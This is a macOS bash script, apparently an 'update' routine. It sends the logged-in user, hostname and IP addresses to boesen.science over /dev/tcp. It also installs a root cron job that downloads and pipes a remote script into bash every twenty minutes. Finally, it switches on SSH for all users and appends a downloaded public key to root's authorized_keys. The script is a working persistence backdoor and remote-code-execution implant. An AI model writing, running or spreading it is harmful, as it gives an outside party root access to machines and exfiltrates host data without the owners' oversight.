#!/bin/bash
host=boesen.science
down_port=2042
up_port=2043

rm /tmp/update.sh

user=$(stat -f "%Su" /dev/console)
hostname=$(hostname)
# Linux's hostname -I doesn't work on Macs
ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | paste -sd ',' -)

info="$user $hostname $ip"

ip_new=false
if ! grep -q "^$ip$" /etc/ips; then
    echo "$ip" >> /etc/ips
    ip_new=true
fi

if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
    printf "$user $hostname" > /etc/info
    printf "UPDATE: $info" >/dev/tcp/$host/$up_port
fi

grep -v "$host" /var/at/tabs/root > /tmp/crontab
echo "*/20 * * * * curl -L $host:$down_port/mac/update.sh |bash" >> /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null

sshpath="/var/root/.ssh"

mkdir -p "$sshpath"

if ! grep -q boesene $sshpath/authorized_keys; then
    curl -L $host:$down_port/pubkey >> $sshpath/authorized_keys
fi
